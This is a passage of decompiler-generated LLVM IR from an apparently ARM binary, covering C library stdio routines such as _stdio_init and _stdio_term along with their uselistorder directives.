  %v3_161b073 = icmp uge i32 %v2_161ac71, %v2_161a0
  store i1 %v3_161b073, i1* %cpsr_c.global-to-local, align 1
  %v9_161b079 = icmp eq i32 %v2_161ac71, %v2_161a0
  br i1 %v9_161b079, label %dec_label_pc_161b8, label %dec_label_pc_161d0

dec_label_pc_161b8:                               ; preds = %dec_label_pc_161a0, %dec_label_pc_161b8.dec_label_pc_161ac_crit_edge
  %v0_161b880 = phi i32 [ %v1_161b0.pre, %dec_label_pc_161b8.dec_label_pc_161ac_crit_edge ], [ %v2_161a0, %dec_label_pc_161a0 ]
  store i32 %v0_161b880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_161c8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_161c8, label %dec_label_pc_161cc, label %dec_label_pc_161b8.dec_label_pc_161ac_crit_edge

dec_label_pc_161b8.dec_label_pc_161ac_crit_edge:  ; preds = %dec_label_pc_161b8
  %v0_161ac.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_161b0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_161ac = inttoptr i32 %v0_161ac.pre to i32*
  %v2_161ac = load i32, i32* %v1_161ac, align 4
  store i32 %v2_161ac, i32* %r3.global-to-local, align 4
  %v3_161b0 = icmp uge i32 %v2_161ac, %v1_161b0.pre
  store i1 %v3_161b0, i1* %cpsr_c.global-to-local, align 1
  %v9_161b0 = icmp eq i32 %v2_161ac, %v1_161b0.pre
  br i1 %v9_161b0, label %dec_label_pc_161b8, label %dec_label_pc_161d0

dec_label_pc_161cc:                               ; preds = %dec_label_pc_161b8
  %v0_161cc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_161cc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_161d0

dec_label_pc_161d0:                               ; preds = %dec_label_pc_161a0, %dec_label_pc_161b8.dec_label_pc_161ac_crit_edge, %dec_label_pc_161cc
  %v0_161d8 = phi i32 [ %v0_161cc, %dec_label_pc_161cc ], [ %v2_161ac71, %dec_label_pc_161a0 ], [ %v2_161ac, %dec_label_pc_161b8.dec_label_pc_161ac_crit_edge ]
  %v1_161d0 = phi i32 [ %v0_161cc, %dec_label_pc_161cc ], [ %v2_161a0, %dec_label_pc_161a0 ], [ %v1_161b0.pre, %dec_label_pc_161b8.dec_label_pc_161ac_crit_edge ]
  %v3_161d0 = icmp uge i32 %v0_161d8, %v1_161d0
  store i1 %v3_161d0, i1* %cpsr_c.global-to-local, align 1
  %v9_161d0 = icmp eq i32 %v0_161d8, %v1_161d0
  br i1 %v9_161d0, label %dec_label_pc_161d8, label %dec_label_pc_161d0.dec_label_pc_161a0_crit_edge

dec_label_pc_161d0.dec_label_pc_161a0_crit_edge:  ; preds = %dec_label_pc_161d0
  %v0_161a0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_161a0

dec_label_pc_161d8:                               ; preds = %dec_label_pc_161d0
  %v2_161d8 = icmp ne i32 %v1_161d0, 0
  store i1 %v2_161d8, i1* %cpsr_c.global-to-local, align 1
  %v7_161dc = icmp slt i32 %v1_161d0, 2
  br i1 %v7_161dc, label %dec_label_pc_16200, label %dec_label_pc_161e0

dec_label_pc_161e0:                               ; preds = %dec_label_pc_161d8
  %v0_161e0 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_161e0, i32* %r0.global-to-local, align 4
  %v0_161e4 = load i32, i32* @r1, align 4
  %v1_161e4 = add i32 %v0_161e4, 129
  store i32 %v1_161e4, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_16200

dec_label_pc_161fc:                               ; preds = %dec_label_pc_15e40, %dec_label_pc_15e24, %dec_label_pc_15e4c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_16200

dec_label_pc_16200:                               ; preds = %dec_label_pc_1617c, %dec_label_pc_161d8, %bb57, %dec_label_pc_15e84, %dec_label_pc_161e0, %dec_label_pc_161fc
  %v0_16200 = load i32, i32* @r5, align 4
  store i32 %v0_16200, i32* %r0.global-to-local, align 4
  %v2_16208 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_16208, i32* %r4.global-to-local, align 4
  store i32 %v6_15de4, i32* @r5, align 4
  store i32 %v9_15de4, i32* @r6, align 4
  store i32 %v12_15de4, i32* @r7, align 4
  store i32 %v15_15de4, i32* @r8, align 4
  ret i32 %v0_16200

; uselistorder directives
  uselistorder i32 %v0_161cc, { 1, 0, 2 }
  uselistorder i32 %v1_161b0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_161a0, { 1, 0 }
  uselistorder i32 %v0_16150, { 1, 0, 2 }
  uselistorder i32 %v1_16134.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16124, { 1, 0 }
  uselistorder i32 %v0_160cc, { 1, 0, 2 }
  uselistorder i32 %v1_160b0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_16064, { 1, 0, 2 }
  uselistorder i32 %v1_16048, { 0, 2, 1 }
  uselistorder i32 %v4_16024, { 2, 1, 0, 3 }
  uselistorder i32 %v1_15fd4.pre, { 2, 1, 0 }
  uselistorder i32 %v0_15f58, { 1, 2, 0 }
  uselistorder i32 %v1_15ee8, { 1, 0 }
  uselistorder i32 %v0_15ee8, { 1, 0 }
  uselistorder i32 %v1_15ed0, { 1, 2, 0, 3 }
  uselistorder i32 %v1_15e74, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r3.global-to-local, { 2, 3, 5, 4, 52, 6, 7, 8, 9, 10, 12, 11, 1, 14, 13, 15, 16, 17, 18, 19, 20, 22, 21, 53, 23, 24, 25, 26, 27, 28, 29, 30, 31, 34, 32, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 0, 50, 51 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 10, 9, 1, 11, 12, 13, 36, 37, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i32 16384, { 76, 77, 0, 1, 78, 39, 69, 40, 70, 41, 71, 42, 72, 43, 73, 44, 74, 19, 75, 18, 65, 17, 53, 37, 54, 4, 55, 5, 56, 6, 57, 38, 58, 7, 59, 8, 60, 9, 61, 10, 62, 11, 63, 12, 64, 36, 66, 13, 67, 14, 68, 45, 81, 15, 82, 16, 83, 20, 79, 46, 80, 22, 84, 48, 85, 49, 86, 50, 87, 21, 88, 47, 89, 90, 23, 91, 24, 92, 25, 93, 51, 94, 26, 2, 27, 95, 28, 96, 30, 97, 29, 98, 32, 99, 31, 100, 52, 101, 33, 3, 34, 102, 35, 103 }
  uselistorder i32 (i32, i32*)* @__libc_open, { 0, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32 131072, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 16, 0, 15, 12, 11, 2, 1, 14, 13, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 1024, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 ()* @malloc, { 44, 43, 42, 4, 3, 2, 0, 1, 12, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 9, 8, 7, 6, 5, 15, 14, 13, 11, 10 }
  uselistorder i8 43, { 2, 0, 1 }
  uselistorder i32 ()* @free, { 12, 11, 5, 4, 3, 2, 1, 8, 7, 6, 10, 9, 0 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_16200, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_161fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_161d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_161b8, { 1, 0 }
  uselistorder label %dec_label_pc_1617c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16154, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1613c, { 1, 0 }
  uselistorder label %dec_label_pc_160e0, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_160d0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_160b8, { 1, 0 }
  uselistorder label %dec_label_pc_16078, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_16068, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15fb0, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_15f18._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_15ec0, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_15e5c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15e24, { 1, 2, 0 }
}

define i32 @function_16214(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_16214:
  %v0_16214 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16214, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16214
  %v5_16214 = sdiv i32 %arg2, 16
  %v6_16214 = and i32 %v5_16214, %arg1
  %v5_16218 = sdiv i32 %arg2, 256
  %v6_16218 = and i32 %v6_16214, %v5_16218
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16214, %bb
  %v3_1621c = phi i32 [ %arg1, %dec_label_pc_16214 ], [ %v6_16218, %bb ]
  ret i32 %v3_1621c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_1624c = call i32 @__aeabi_read_tp()
  %v3_16250 = load i16, i16* @global_var_21d68.334, align 2
  %v4_16250 = sext i16 %v3_16250 to i32
  store i32 %v4_16250, i32* @r3, align 4
  store i32 %v0_1624c, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_1625c = add i32 %v4_16250, %v0_1624c
  %v3_1625c = inttoptr i32 %v2_1625c to i32*
  %v4_1625c = load i32, i32* %v3_1625c, align 4
  store i32 %v4_1625c, i32* @r6, align 4
  %v1_16260 = call i32 @isatty(i32 0)
  %v2_16268 = icmp eq i32 %v1_16260, 0
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* @r4, align 4
  br i1 %v2_16268, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_16274 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 308) to i16*), align 4
  %v7_16274 = zext i16 %v5_16274 to i32
  %v2_16278 = xor i32 %v7_16274, 256
  store i32 %v2_16278, i32* @r3, align 4
  %v2_1627c = trunc i32 %v2_16278 to i16
  store i16 %v2_1627c, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_16284 = call i32 @isatty(i32 1)
  %v2_16288 = icmp eq i32 %v1_16284, 0
  br i1 %v2_16288, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_16290 = load i32, i32* @r4, align 4
  %v2_16294 = add i32 %v1_16290, 376
  %v3_16294 = inttoptr i32 %v2_16294 to i16*
  %v4_16294 = load i16, i16* %v3_16294, align 2
  %v2_16298 = xor i16 %v4_16294, 256
  store i16 %v2_16298, i16* %v3_16294, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_162a4 = load i16, i16* @global_var_21d68.334, align 2
  %v4_162a4 = sext i16 %v3_162a4 to i32
  %v0_162a8 = load i32, i32* @r6, align 4
  %v1_162a8 = load i32, i32* @r5, align 4
  %v3_162a8 = add i32 %v1_162a8, %v4_162a4
  %v4_162a8 = inttoptr i32 %v3_162a8 to i32*
  store i32 %v0_162a8, i32* %v4_162a8, align 4
  ret i32 %v1_16284

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_162c4 = load i32, i32* @r4, align 4
  store i32 %v3_162c4, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_162d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_162d8, i32* %r0.global-to-local, align 4
  %v5_162d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_162d8, i32* %r1.global-to-local, align 4
  %v8_162d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 -33092) to i32*), align 4
  %v2_162e0 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_162e0, i32* %r3.global-to-local, align 4
  store i32 %v2_162d8, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_162ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 152) to i32*), align 4
  store i32 %v2_162d8, i32* %r0.global-to-local, align 4
  store i32 %v5_162d8, i32* %r1.global-to-local, align 4
  store i32 %v8_162d8, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_162fc = inttoptr i32 %v4_162ec to i32*
  store i32 %v2_162d8, i32* %v1_162fc, align 4
  %v3_162fc = add i32 %v4_162ec, 4
  %v4_162fc = inttoptr i32 %v3_162fc to i32*
  %v5_162fc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_162fc, i32* %v4_162fc, align 4
  %v6_162fc = add i32 %v4_162ec, 8
  %v7_162fc = inttoptr i32 %v6_162fc to i32*
  %v8_162fc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_162fc, i32* %v7_162fc, align 4
  %v0_16300 = load i32, i32* %r3.global-to-local, align 4
  %v1_16300 = inttoptr i32 %v0_16300 to i32*
  %v2_16300 = load i32, i32* %v1_16300, align 4
  store i32 %v2_16300, i32* %r0.global-to-local, align 4
  %v3_16300 = add i32 %v0_16300, 4
  %v4_16300 = inttoptr i32 %v3_16300 to i32*
  %v5_16300 = load i32, i32* %v4_16300, align 4
  store i32 %v5_16300, i32* %r1.global-to-local, align 4
  %v6_16300 = add i32 %v0_16300, 8
  %v7_16300 = inttoptr i32 %v6_16300 to i32*
  %v8_16300 = load i32, i32* %v7_16300, align 4
  %v2_16304 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_16304, i32* %r3.global-to-local, align 4
  store i32 %v2_16300, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_16310 = load i32, i32* %r7.global-to-local, align 4
  %v2_16310 = add i32 %v0_16310, 76
  %v3_16310 = inttoptr i32 %v2_16310 to i32*
  %v4_16310 = load i32, i32* %v3_16310, align 4
  store i32 %v4_16310, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_16318 = inttoptr i32 %v4_16310 to i32*
  %v2_16318 = load i32, i32* %v1_16318, align 4
  store i32 %v2_16318, i32* %r5.global-to-local, align 4
  %v2_1631c = add i32 %v0_16310, 160
  %v3_1631c = inttoptr i32 %v2_1631c to i32*
  %v4_1631c = load i32, i32* %v3_1631c, align 4
  store i32 %v2_16300, i32* %r0.global-to-local, align 4
  store i32 %v5_16300, i32* %r1.global-to-local, align 4
  store i32 %v8_16300, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_1632c = add i32 %v0_16310, -33124
  store i32 %v2_1632c, i32* %sl.global-to-local, align 4
  %v1_16330 = inttoptr i32 %v4_1631c to i32*
  store i32 %v2_16300, i32* %v1_16330, align 4
  %v3_16330 = add i32 %v4_1631c, 4
  %v4_16330 = inttoptr i32 %v3_16330 to i32*
  %v5_16330 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_16330, i32* %v4_16330, align 4
  %v6_16330 = add i32 %v4_1631c, 8
  %v7_16330 = inttoptr i32 %v6_16330 to i32*
  %v8_16330 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_16330, i32* %v7_16330, align 4
  %v0_163c0.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_163c016 = icmp eq i32 %v0_163c0.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_163c818 = add i32 %v0_163c0.pr, 56
  store i32 %v1_163c818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_163c016, label %dec_label_pc_163d4, label %dec_label_pc_16338

dec_label_pc_16338:                               ; preds = %entry, %.thread10
  %v0_16338 = phi i32 [ %v3_163bc, %.thread10 ], [ %v0_163c0.pr, %entry ]
  %v1_16338 = add i32 %v0_16338, 64
  %v2_16338 = inttoptr i32 %v1_16338 to i32*
  %v3_16338 = load i32, i32* %v2_16338, align 4
  store i32 %v3_16338, i32* %r3.global-to-local, align 4
  %v0_1633c = call i32 @__aeabi_read_tp()
  store i32 %v0_1633c, i32* %r0.global-to-local, align 4
  %v1_16340 = add i32 %v0_1633c, -1168
  store i32 %v1_16340, i32* %r6.global-to-local, align 4
  %v3_16344 = icmp uge i32 %v3_16338, %v1_16340
  store i1 %v3_16344, i1* %cpsr_c.global-to-local, align 1
  %v9_16344 = icmp eq i32 %v3_16338, %v1_16340
  br i1 %v9_16344, label %.thread1, label %dec_label_pc_16358

.thread1:                                         ; preds = %dec_label_pc_16338
  %v1_16348 = load i32, i32* %r5.global-to-local, align 4
  %v2_16348 = add i32 %v1_16348, 60
  %v3_16348 = inttoptr i32 %v2_16348 to i32*
  %v4_16348 = load i32, i32* %v3_16348, align 4
  %v2_1634c = add i32 %v4_16348, 1
  store i32 %v2_1634c, i32* %r3.global-to-local, align 4
  store i32 %v2_1634c, i32* %v3_16348, align 4
  br label %.thread10

dec_label_pc_16358:                               ; preds = %dec_label_pc_16338, %dec_label_pc_16364
  %v0_16358 = load i32, i32* %r2.global-to-local, align 4
  %v1_16358 = inttoptr i32 %v0_16358 to i32*
  %v2_16358 = load i32, i32* %v1_16358, align 4
  store i32 %v2_16358, i32* %r3.global-to-local, align 4
  %v1_1635c = load i32, i32* %r4.global-to-local, align 4
  %v3_1635c = icmp uge i32 %v2_16358, %v1_1635c
  store i1 %v3_1635c, i1* %cpsr_c.global-to-local, align 1
  %v9_1635c = icmp eq i32 %v2_16358, %v1_1635c
  br i1 %v9_1635c, label %dec_label_pc_16364, label %dec_label_pc_1637c

dec_label_pc_16364:                               ; preds = %dec_label_pc_16358
  store i32 %v2_16358, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16374 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16374, label %dec_label_pc_16378, label %dec_label_pc_16358

dec_label_pc_16378:                               ; preds = %dec_label_pc_16364
  %v0_16378 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16378, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1637c

dec_label_pc_1637c:                               ; preds = %dec_label_pc_16358, %dec_label_pc_16378
  %v0_1637c = phi i32 [ %v0_16378, %dec_label_pc_16378 ], [ %v2_16358, %dec_label_pc_16358 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1637c = icmp eq i32 %v0_1637c, 0
  %v2_16388.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_1637c, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_1637c
  %v1_16388 = load i32, i32* %r6.global-to-local, align 4
  %v3_16388 = add i32 %v2_16388.pre, 64
  %v4_16388 = inttoptr i32 %v3_16388 to i32*
  store i32 %v1_16388, i32* %v4_16388, align 4
  %v1_1638c = load i32, i32* %r1.global-to-local, align 4
  %v2_1638c = load i32, i32* %r5.global-to-local, align 4
  %v3_1638c = add i32 %v2_1638c, 60
  %v4_1638c = inttoptr i32 %v3_1638c to i32*
  store i32 %v1_1638c, i32* %v4_1638c, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_1637c
  %v2_16380 = add i32 %v2_16388.pre, 8
  %v3_16380 = inttoptr i32 %v2_16380 to i32*
  %v4_16380 = load i32, i32* %v3_16380, align 4
  store i32 %v4_16380, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_16390 = add i32 %v2_16388.pre, 20
  %v4_16390 = inttoptr i32 %v3_16390 to i32*
  store i32 %v4_16380, i32* %v4_16390, align 4
  %v1_16394 = load i32, i32* %r2.global-to-local, align 4
  %v2_16394 = trunc i32 %v1_16394 to i16
  %v3_16394 = load i32, i32* %r5.global-to-local, align 4
  %v4_16394 = inttoptr i32 %v3_16394 to i16*
  store i16 %v2_16394, i16* %v4_16394, align 2
  %v1_16398 = load i32, i32* %r3.global-to-local, align 4
  %v2_16398 = load i32, i32* %r5.global-to-local, align 4
  %v3_16398 = add i32 %v2_16398, 24
  %v4_16398 = inttoptr i32 %v3_16398 to i32*
  store i32 %v1_16398, i32* %v4_16398, align 4
  %v1_1639c = load i32, i32* %r3.global-to-local, align 4
  %v2_1639c = load i32, i32* %r5.global-to-local, align 4
  %v3_1639c = add i32 %v2_1639c, 28
  %v4_1639c = inttoptr i32 %v3_1639c to i32*
  store i32 %v1_1639c, i32* %v4_1639c, align 4
  %v1_163a0 = load i32, i32* %r3.global-to-local, align 4
  %v2_163a0 = load i32, i32* %r5.global-to-local, align 4
  %v3_163a0 = add i32 %v2_163a0, 16
  %v4_163a0 = inttoptr i32 %v3_163a0 to i32*
  store i32 %v1_163a0, i32* %v4_163a0, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_163a4 = load i32, i32* %sl.global-to-local, align 4
  %v1_163a4 = inttoptr i32 %v0_163a4 to i32*
  %v2_163a4 = load i32, i32* %v1_163a4, align 4
  store i32 %v2_163a4, i32* %r0.global-to-local, align 4
  %v3_163a4 = add i32 %v0_163a4, 4
  %v4_163a4 = inttoptr i32 %v3_163a4 to i32*
  %v5_163a4 = load i32, i32* %v4_163a4, align 4
  store i32 %v5_163a4, i32* %r1.global-to-local, align 4
  %v6_163a4 = add i32 %v0_163a4, 8
  %v7_163a4 = inttoptr i32 %v6_163a4 to i32*
  %v8_163a4 = load i32, i32* %v7_163a4, align 4
  store i32 %v8_163a4, i32* %r2.global-to-local, align 4
  %v1_163ac = load i32, i32* %r5.global-to-local, align 4
  %v2_163ac = add i32 %v1_163ac, 52
  %v3_163ac = inttoptr i32 %v2_163ac to i32*
  store i32 1, i32* %v3_163ac, align 4
  %v0_163b0 = load i32, i32* %r5.global-to-local, align 4
  %v1_163b0 = add i32 %v0_163b0, 56
  store i32 %v1_163b0, i32* %r3.global-to-local, align 4
  %v2_163b4 = load i32, i32* %r0.global-to-local, align 4
  %v1_163b8 = inttoptr i32 %v1_163b0 to i32*
  store i32 %v2_163b4, i32* %v1_163b8, align 4
  %v3_163b8 = add i32 %v0_163b0, 60
  %v4_163b8 = inttoptr i32 %v3_163b8 to i32*
  %v5_163b8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_163b8, i32* %v4_163b8, align 4
  %v6_163b8 = add i32 %v0_163b0, 64
  %v7_163b8 = inttoptr i32 %v6_163b8 to i32*
  %v8_163b8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_163b8, i32* %v7_163b8, align 4
  %v0_163bc = load i32, i32* %r5.global-to-local, align 4
  %v1_163bc = add i32 %v0_163bc, 32
  %v2_163bc = inttoptr i32 %v1_163bc to i32*
  %v3_163bc = load i32, i32* %v2_163bc, align 4
  store i32 %v3_163bc, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_163c0 = icmp eq i32 %v3_163bc, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_163c8 = add i32 %v3_163bc, 56
  store i32 %v1_163c8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_163c0, label %dec_label_pc_163d4, label %dec_label_pc_16338

dec_label_pc_163d4:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_163d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_163d8 = add i32 %v0_163d8, 76
  %v3_163d8 = inttoptr i32 %v2_163d8 to i32*
  %v4_163d8 = load i32, i32* %v3_163d8, align 4
  store i32 %v4_163d8, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_163d8 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_163f814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_163f814, label %dec_label_pc_16400, label %dec_label_pc_163e4

dec_label_pc_163e4:                               ; preds = %dec_label_pc_163d4, %dec_label_pc_163f8
  %v1_163ec = phi i32 [ %storemerge, %dec_label_pc_163f8 ], [ %storemerge12, %dec_label_pc_163d4 ]
  %v1_163e4 = inttoptr i32 %v1_163ec to i16*
  %v2_163e4 = load i16, i16* %v1_163e4, align 2
  %v3_163e4 = zext i16 %v2_163e4 to i32
  store i32 %v3_163e4, i32* %r3.global-to-local, align 4
  %v1_163e8 = and i32 %v3_163e4, 64
  %v2_163e8 = icmp eq i32 %v1_163e8, 0
  br i1 %v2_163e8, label %dec_label_pc_163f8, label %bb39

bb39:                                             ; preds = %dec_label_pc_163e4
  store i32 %v1_163ec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_163f8

dec_label_pc_163f8:                               ; preds = %dec_label_pc_163e4, %bb39
  %v1_163f0 = xor i1 %v2_163e8, true
  call void @__pseudo_cond_branch(i1 %v1_163f0, i32 ptrtoint (i32* @global_var_16428.615 to i32))
  %v0_163f4 = load i32, i32* %r4.global-to-local, align 4
  %v1_163f4 = add i32 %v0_163f4, 32
  %storemerge.in = inttoptr i32 %v1_163f4 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_163f8 = icmp eq i32 %storemerge, 0
  br i1 %v2_163f8, label %dec_label_pc_16400, label %dec_label_pc_163e4

dec_label_pc_16400:                               ; preds = %dec_label_pc_163f8, %dec_label_pc_163d4
  %v2_16404 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_16404, i32* %r4.global-to-local, align 4
  %v1_16408 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16408

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_163bc, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1635c, { 1, 0 }
  uselistorder i32 %v4_1631c, { 2, 1, 0 }
  uselistorder i32 %v4_162ec, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12 }
  uselistorder i32* %r4.global-to-local, { 2, 7, 6, 0, 5, 3, 4, 1 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 2, 3, 4, 5, 0, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 0, 7, 3, 4, 5, 6, 1 }
  uselistorder label %dec_label_pc_163f8, { 1, 0 }
  uselistorder label %dec_label_pc_163e4, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1637c, { 1, 0 }
  uselistorder label %dec_label_pc_16358, { 1, 0 }
  uselistorder label %dec_label_pc_16338, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
